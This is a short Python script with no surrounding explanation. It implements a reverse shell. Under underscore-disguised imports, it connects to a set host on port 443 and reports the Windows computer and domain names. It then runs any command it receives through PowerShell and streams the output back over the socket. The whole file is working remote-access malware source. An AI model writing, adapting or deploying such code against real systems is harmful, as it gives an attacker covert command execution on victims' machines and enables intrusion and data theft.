import os as __
import socket as ___
import struct as ____
import subprocess as _____

a = "localhost"
p = 443
try:
    s = ___.socket(___.AF_INET,___.SOCK_STREAM)
    s.connect((a,p))
    while True:
        cwd = __.getcwd()
        h = __.environ["COMPUTERNAME"] + "@" + __.environ["USERDOMAIN"]
        prompt = "({}) - [{}]".format(h, cwd)
        
        s.send(prompt.encode())
        
        bd = s.recv(1024)
        
        bs = int(bd.decode())
        
        d = s.recv(bs)
        
        if d == "":
            break
        
        if d[:2].decode() == "cd":
            try:
                __.chdir(d[3:].decode())
                continue
            except:
                continue
        try:
            
            p = _____.Popen(["powershell", "-Command", d.decode()], shell=True, stdout=_____.PIPE, stderr=_____.PIPE, stdin=_____.PIPE)
            
            std_v = p.stdout.read() + p.stderr.read()
        except Exception as e:
            
            std_v = "Error: " + str(e)
        
        bs = ____.calcsize("{}s".format(len(std_v)))
        s.send(str(bs).encode())
        s.send(std_v)
except Exception as e:
    print("Error occured: ", str(e))
finally:
    s.close()
